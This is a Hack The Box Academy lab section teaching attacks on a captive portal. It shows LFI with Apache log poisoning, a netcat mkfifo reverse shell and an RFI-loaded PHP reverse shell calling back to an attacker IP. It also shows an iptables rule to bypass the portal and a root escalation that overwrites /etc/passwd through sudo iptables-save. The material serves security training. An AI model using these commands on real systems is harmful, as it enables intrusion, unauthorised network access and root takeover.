
<h1>File Inclusion and Granting our own Exception</h1>
<hr/>
<p>In some cases, more advanced captive portal servers include widgets such as weather updates or the time of day. These features can sometimes introduce inclusion-based vulnerabilities similar to those found in other web servers. To learn more about this attack, refer to the <a href="https://academy.hackthebox.com/module/details/23">File Inclusion</a> module.</p>
<p>In this section, we will explore two examples of inclusion vulnerabilities, along with a visudo misconfiguration related to iptables.</p>
<hr/>
<h2>Local File Inclusion</h2>
<p>Local File Inclusion (LFI) is a vulnerability that allows an attacker to include and execute files on a web server by manipulating input parameters. This often happens when user input is used to dynamically load files without proper validation.</p>
<p>Suppose we navigate to a captive portal's web page and observe the following:</p>
<img class="website-screenshot" data-url="http://192.168.0.6/login.php?file=Time-Widget.php" src="/storage/modules/207/widgetinclusion1.png"/>
<p>We might notice that the page is loading a local file, such as a time widget displaying the system time. To test for Local File Inclusion (LFI), we can attempt to load the /etc/passwd file by modifying the URL or request parameters.</p>
<p><code>http://192.168.0.6/login.php?file=/../../../../../etc/passwd</code></p>
<img class="website-screenshot" data-url="http://192.168.0.6/login.php?file=/../../../../../etc/passwd" src="/storage/modules/207/widgetinclusion2.png"/>
<p>This works because the server dynamically includes files based on user input without proper validation or sanitization. Let's break it down using the first code block:</p>
<pre><code class="language-php">&lt;?php
if (isset($_GET['file']) &amp;&amp; !empty($_GET['file'])) {
        $file = $_GET['file'];
} else {
        $file = 'Time-Widget.php';
}
require $file;
?&gt;
</code></pre>
<p>Here, if a file parameter is provided in the URL (e.g., http://example.com/index.php?file=../../etc/passwd), the server will attempt to include and execute that file. If no file is specified, it defaults to Time-Widget.php. This allows Local File Inclusion (LFI) attacks by referencing system files like /etc/passwd.</p>
<p>In some cases, the vulnerable code might look like this:</p>
<pre><code class="language-php">&lt;?php include($_GET['file'].".php"); ?&gt;
</code></pre>
<p>This variation restricts file inclusion to .php files, preventing direct access to system files like /etc/passwd. However, attackers can still exploit it by uploading their own malicious .php file or attempting null byte injection (if the server is running an older PHP version that does not properly handle null bytes).</p>
<p><code>http://192.168.0.6/login.php?file=/../../../../../etc/passwd%00</code></p>
<p>Traditionally, Local File Inclusion (LFI) vulnerabilities can be leveraged in combination with other weaknesses to escalate an attack. Two common techniques used alongside LFI are:</p>
<ol>
<li>
<code>Log Contamination</code> – Injecting malicious input into server logs and then including those logs via LFI to execute code.</li>
<li>
<code>File Upload Vulnerability</code> – Uploading a malicious file and including it via LFI to gain code execution.</li>
</ol>
<p>In this example, we will explore log contamination by targeting the Apache access log to achieve command execution.</p>
<p>We begin by navigating to: <code>http://192.168.0.6/login.php?file=../../../var/log/apache2/access.log</code></p>
<img class="website-screenshot" data-url="http://192.168.0.6/login.php?file=../../../var/log/apache2/access.log" src="/storage/modules/207/widgetinclusion3.png"/>
<p>This forces the web server to display its access log. If the log file is included successfully, we should see HTTP requests made to the server, including our own request. Our goal is to inject PHP code into the logs and then include that log file through LFI to execute the payload.</p>
<p>If the Apache access log successfully renders on the webpage, it indicates that the server has misconfigured permissions on the /var/log/apache2/ directory. Typically, Apache logs are readable only by root, preventing unauthorized access. However, if the web server’s process (www-data) has read access, we can retrieve log contents. If it has write access, we can inject malicious payloads into the log file.</p>
<hr/>
<h3>Contaminating the Access Log</h3>
<p>Since web requests are automatically logged, we can inject PHP code into the log file by sending an invalid HTTP request. When this log file is later included via LFI, the PHP code executes.</p>
<p>We send a malformed HTTP request with embedded PHP code:</p>
<pre><code class="language-shell-session">[!bash!]$ nc 192.168.0.6 80

&lt;?php echo `whoami`; ?&gt;

HTTP/1.1 400 Bad Request
</code></pre>
<p>Since this request format is invalid, Apache logs it as an error. However, the injected PHP payload gets written into the log file.</p>
<p>Now, if we visit: <code>http://192.168.0.6/login.php?file=../../../var/log/apache2/access.log</code>, we should see the output of <code>whoami</code> displayed on the page, it confirms that we have command execution.</p>
<img class="website-screenshot" data-url="http://192.168.0.6/login.php?file=../../../var/log/apache2/access.log" src="/storage/modules/207/widgetinclusion4.png"/>
<p>This vulnerability allows an attacker to escalate from LFI to Remote Code Execution (RCE), enabling full control over the target system.</p>
<p>We could as well validate this with the <code>ifconfig</code> command.</p>
<pre><code class="language-shell-session">[!bash!]$ nc 192.168.0.6 80

&lt;?php echo `ifconfig`; ?&gt;

HTTP/1.1 400 Bad Request
Server: Apache/2.4.56 (Debian)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;400 Bad Request&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Bad Request&lt;/h1&gt;
&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.56 (Debian) Server at 127.0.1.1 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>Upon navigating back to the webpage we should notice the output of the ifconfig command. With this, we should be able to get a reverse shell with no problem.</p>
<img class="website-screenshot" data-url="http://192.168.0.6/login.php?file=../../../var/log/apache2/access.log" src="/storage/modules/207/widgetinclusion5.png"/>
<p>If the target web server has Netcat installed, we can escalate Local File Inclusion (LFI) to a Remote Code Execution (RCE) attack by injecting a reverse shell into the Apache access log. This would allow us to gain a foothold on the captive portal web server.</p>
<p>Since Apache logs invalid HTTP requests, we can inject a Netcat reverse shell payload into the log by sending an invalid request.</p>
<pre><code class="language-shell-session">[!bash!]$ nc 192.168.0.6 80

&lt;?php echo `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.19 4444 &gt;/tmp/f`; ?&gt;

HTTP/1.1 400 Bad Request
</code></pre>
<p>This command logs a malformed HTTP request containing PHP code. If the log file is later included through LFI, the payload will execute and establish a reverse shell.</p>
<p>Before triggering the payload, we must start a listener on our attack machine:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -nlvp 4444

listening on [any] 4444 ...
</code></pre>
<p>Netcat is now waiting for an incoming connection from the target.</p>
<p>To execute the payload, we navigate to the vulnerable LFI endpoint: <code>http://192.168.0.6/login.php?file=../../../var/log/apache2/access.log</code></p>
<p>If successful, the target server will execute the reverse shell command and connect back to our listener.</p>
<pre><code class="language-shell-session">[!bash!]$ nc -nlvp 4444      

listening on [any] 4444 ...
connect to [192.168.0.19] from (UNKNOWN) [192.168.0.6] 59710

whoami
www-data
</code></pre>
<hr/>
<h2>Remote File Inclusion</h2>
<p>Remote File Inclusion (RFI) is a vulnerability that allows an attacker to inject and execute remote files (such as malicious scripts) on a web server. This typically occurs when an application dynamically includes files based on user input without proper validation.</p>
<p>If the target is vulnerable to Remote File Inclusion (RFI), we can load and execute a malicious PHP script from our attack machine. To do this, we first need to host the malicious file and then trick the server into executing it.</p>
<p>We first need to host the PHP reverse shell script from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentestmonkey’s</a> repository. Before doing so, we must modify the script to include our attacking machine’s IP address and port.</p>
<p>Open the script in a text editor and update the IP and port values:</p>
<pre><code class="language-shell-session">[!bash!]$ nano php-reverse-shell.php
&lt;snip&gt;
$ip = '192.168.0.19';  // CHANGE THIS TO ATTACKER'S IP
$port = 4444;          // CHANGE THIS TO ATTACKER'S PORT
&lt;/snip&gt;
</code></pre>
<p>Before delivering the payload, we need to start a listener on our attacking machine to catch the incoming connection.</p>
<pre><code class="language-shell-session">[!bash!]$ nc -nlvp 4444

listening on [any] 4444 ...
</code></pre>
<p>We will serve the modified PHP reverse shell using Python’s built-in web server.</p>
<pre><code class="language-shell-session">[!bash!]$ python3 -m http.server 3333

Serving HTTP on 0.0.0.0 port 3333 (http://0.0.0.0:3333/) ...
</code></pre>
<p>Now, we navigate to the captive portal and force it to include our malicious file: <code>http://192.168.0.6/login.php?file=http://192.168.0.19:3333/php-reverse-shell.php</code></p>
<p>Once the server includes our file, our listener should receive a connection:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -nlvp 4444             

listening on [any] 4444 ...
connect to [192.168.0.19] from (UNKNOWN) [192.168.0.6] 43618
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
</code></pre>
<hr/>
<h2>Granting Exception</h2>
<p>At this point, we have successfully exploited Remote File Inclusion (RFI) to gain a reverse shell on the target web server. We can now explore privilege escalation techniques or bypass the captive portal’s authentication system entirely.</p>
<p>A common misconfiguration in some captive portal applications involves improper visudo settings. Specifically, www-data may have permission to execute the iptables command as a sudoer without requiring a password. This misconfiguration makes it much easier to manipulate firewall rules directly through a PHP script.</p>
<p>We can check for this vulnerability by running the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo -l

Matching Defaults entries for www-data on Captive:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on Captive:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/sudo -l
    (ALL) NOPASSWD: /sbin/iptables-save
    (ALL) NOPASSWD: /sbin/iptables
</code></pre>
<p>If www-data has unrestricted access to <code>iptables</code>, we can leverage this to modify network rules and extend our access. If we find that www-data can execute iptables without requiring a password, we may be able to create our own exception. Before doing so, we should gather information about the captive portal’s network interfaces to determine the correct forwarding rules.</p>
<p>We can list the available network interfaces using:</p>
<pre><code class="language-shell-session">[!bash!]$ ifconfig

eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.0.6  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::13c4:77b5:257f:3881  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether c8:d9:d2:7c:a1:ca  txqueuelen 1000  (Ethernet)
        RX packets 15073  bytes 1490246 (1.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12653  bytes 1857062 (1.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 127  base 0x9000
wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
        ether 7a:d6:b6:67:f2:a8  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>
<p>Then, we can create a forwarding rule that allows traffic to bypass the captive portal by specifying our IP address:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo iptables -A FORWARD -s &lt;our-ip&gt; -j ACCEPT
</code></pre>
<p>For added persistence, we can manually assign ourselves a static IP when connecting to the network. This ensures that our forwarding rule remains effective even if the network attempts to reassign IP addresses dynamically.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo iptables -A FORWARD -i wlan0 -o eth0 -s 192.168.0.19 -j ACCEPT
</code></pre>
<hr/>
<h3>Performing Privilege Escalcation</h3>
<p>Since both <code>iptables</code> and <code>iptables-save</code> can be executed as sudo without a password, we can leverage this misconfiguration for privilege escalation and gain root access. A detailed breakdown of this method is available in this <a href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/">blog post</a>. We can exploit the ability to run <code>iptables-save</code> as sudo to edit the <code>/etc/passwd</code> file and replace the root password hash, effectively escalating our privileges to root.</p>
<p>We create a new password hash for password <code>toor</code> using OpenSSL:</p>
<pre><code class="language-shell-session">[!bash!]$ openssl passwd toor

$1$UnY3zxK5$zXR2dgAYm0YBR9fkNZZW10
</code></pre>
<p>Next, we execute the following three commands to embed the root password hash as a comment in the iptables rule. Later, we will use iptables-save to write this data into /etc/passwd, effectively granting us root access.</p>
<pre><code class="language-shell-session">[!bash!]$ bash
[!bash!]$ sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nroot:$1$UnY3zxK5$zXR2dgAYm0YBR9fkNZZW10:0:0:root:/root:/bin/bash\n'
[!bash!]$ sudo iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -i htb0 -j ACCEPT
-A INPUT -i htb0 -j ACCEPT
-A INPUT -i htb0 -j ACCEPT
-A INPUT -i lo -m comment --comment "
root:$1$UnY3zxK5$zXR2dgAYm0YBR9fkNZZW10:0:0:root:/root:/bin/bash
" -j ACCEPT
</code></pre>
<ul>
<li>The <code>bash</code> ensures we are in a Bash shell.</li>
<li>The <code>--comment</code> flag in iptables command is used to insert the new root password hash into the iptables rule.</li>
<li>The <code>iptables -S</code>, lists all iptables rules, allowing us to confirm that our comment (which includes the root hash) has been added successfully in a new line.</li>
</ul>
<p>Now, we execute the following command to save the modified iptables rules, effectively overwriting /etc/passwd with our injected root password hash:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo iptables-save -f /etc/passwd
</code></pre>
<p>We can verify that our attack was successful by checking the contents of the /etc/passwd file. If everything worked as intended, the file should now contain our injected root hash along with the iptables rules.</p>
<pre><code class="language-shell-session">[!bash!]$ cat /etc/passwd

# Generated by iptables-save v1.8.7 on Thu Mar 13 19:43:59 2025
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -i htb0 -j ACCEPT
-A INPUT -i htb0 -j ACCEPT
-A INPUT -i htb0 -j ACCEPT
-A INPUT -i lo -m comment --comment "
root:$1$UnY3zxK5$zXR2dgAYm0YBR9fkNZZW10:0:0:root:/root:/bin/bash
" -j ACCEPT
</code></pre>
<p>After this, we can use the following command to login as root:</p>
<pre><code class="language-shell-session">[!bash!]$ su root

password: toor
</code></pre>
<p>At this point, we should have full control over the system.</p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="34" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="48" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2995 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2995"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Perform the File Inclusion attack as shown in the section to read the file /opt/flag.txt. What is the flag?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2995" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2995">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2995" id="btnAnswer2995">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2996 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2996"><span class="badge badge-soft-dark font-size-14 mr-2">+ 3 <i class="fad fa-cube text-success"></i></span> Perform the privilege escalation attack as shown in the section and retrieve the flag from /root/flag.txt. What is the flag?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2996" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2996">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2996" id="btnAnswer2996">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
